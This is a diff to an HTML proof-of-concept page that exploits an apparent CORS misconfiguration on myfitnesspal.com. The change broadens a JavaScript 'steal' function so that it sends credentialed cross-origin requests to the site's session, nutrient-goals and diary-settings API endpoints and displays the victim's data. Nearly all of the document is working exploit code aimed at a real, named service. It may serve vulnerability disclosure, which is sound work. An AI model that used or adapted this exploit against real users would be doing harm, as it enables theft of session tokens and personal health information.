@@ -4,21 +4,27 @@
 <body>
 <h1>MyFitnessPal CORS Misconfiguration PoC</h1>
 <p>Victim data stolen from myfitnesspal.com:</p>
-<pre id="output">Fetching...</pre>
+<pre id="session">Session: fetching...</pre>
+<pre id="goals">Nutrient Goals: fetching...</pre>
+<pre id="diary">Diary Settings: fetching...</pre>
 <script>
-async function steal() {
+async function steal(url, elementId) {
   try {
-    const r = await fetch('https://www.myfitnesspal.com/api/auth/session', {
+    const r = await fetch(url, {
       credentials: 'include',
       headers: {'Accept': 'application/json'}
     });
     const data = await r.json();
-    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+    document.getElementById(elementId).textContent = 
+      elementId + ': ' + JSON.stringify(data, null, 2);
   } catch(e) {
-    document.getElementById('output').textContent = 'Error: ' + e;
+    document.getElementById(elementId).textContent = elementId + ' Error: ' + e;
   }
 }
-steal();
+
+steal('https://www.myfitnesspal.com/api/auth/session', 'session');
+steal('https://www.myfitnesspal.com/api/services/nutrient-goals', 'goals');
+steal('https://www.myfitnesspal.com/api/services/account/diary_settings', 'diary');
 </script>
 </body>
 </html>
